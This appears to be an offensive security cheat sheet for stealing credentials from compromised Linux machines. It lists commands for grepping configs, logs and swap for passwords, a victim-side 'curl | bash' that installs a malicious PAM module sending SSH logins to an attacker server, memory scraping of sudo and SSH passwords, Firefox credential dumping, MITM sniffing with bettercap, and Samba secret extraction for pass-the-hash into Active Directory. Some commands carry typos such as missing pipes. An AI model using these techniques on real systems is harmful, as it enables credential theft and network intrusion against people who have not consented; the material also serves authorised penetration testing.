# Linux Pillaging

## Credentials

- [Mimipenguin](https://github.com/huntergregal/mimipenguin)

```bash
# Config files containing passwords
grep "password" /etc/*.conf 2>/dev/null

# Apache access log
cat /var/log/apache/access.log | grep -E "^user|^pass"

# Apache access log
cat /var/log/apache/access.log | grep -E "^user|^pass"
```

## Pilfering Credentials from Swap Memory

- Dump sensitive information from swap file
- Needs root access and prone to false positives
- Shell script [swap_digger](https://github.com/sevagas/swap_digger)

```bash
# List swap files
swapon -s
cat /proc/swaps

# Search for strings in swap
strings /dev/sda5  grep "password="
strings /dev/sda5  grep "&password="
```

## Stealing SSH Credentials

- https://mthbernardes.github.io/persistence/2018/02/10/stealing-ssh-credentials-another-approach.html?lipi=urn:li:page:d_flagship3_feed;6EEiLAg8RlyAOl67hZyVRA==
- Steal creds through malicious PAM module
- Every SSH connection attempt will be routed through server you control including the credentials

```bash
# On attacker
# Host install.sh and looter.py using server that can handle POST requests
git clone https://github.com/mthbernades/sshLooter.git
cd sshLooter

# On victim
curl http://$IP:8000/install.sh | bash
```

## Steal Sudo & SSH Process Credentials

- Tool: [3snake](https://www.github.com/blendin/3snake)
- Master zip file: https://github.com/blendin/3snake/archive/master.zip
- Extract password related strings from memory

```bash
# Compile and run 3snake
cd 3snake-master && make
./3snake
```

## Dumping Stored Firefox Credentials

- Gather stored credentials
- Default profile located at `/home/user/.mozilla/firefox`
- Is a folder with random numbers and .default extension
- Credentials stored in profile folder in file called `logins.json`
- Can be dumped using [firefox_decrypt.py](https://github.com/unode/firefox_decrypt/blob/master/firefox_decrypt.py)
- Tool only works if Master Password has not been set

## Capture Credentials over HTTP using MITM Attack

- Tool: bettercap
- Sniff traffic between victim and server hosting FTP/HTTP servers

```bash
# Copy ftp and POST modules
cp /usr/lib/ruby/vendor_ruby/bettercap/sniffer/parsers/ftp.rb .
cp /usr/lib/ruby/vendor_ruby/bettercap/sniffer/parsers/post.rb .

# Launch betercap
bettercap -X -I eth0 182.168.13.68,192.168.13.69 -P post,ftp
```

## Samba Secrets to Domain Admin

- Dump passwords stored on Samba server that has trust relationship with AD infrastructure
- When new Samba user created information is usually stored in `secrets.tdb` file
- Located at `/var/lib/samba/private`
- Decode UTF-8 encoded `data`-filed of file to get NTLM hash
- Crack hash or use PTH-attack to AD using `pth-smbclient` from [pth-toolkit](https://github.com/byt3bl33d3r/pth-toolkit)
- https://medium.com/@br4nsh/from-linux-to-ad-10efb529fae9

```bash
# Dump information from secrets.tdb
tdbdump /var/lib/samba/private/secrets.tdb
```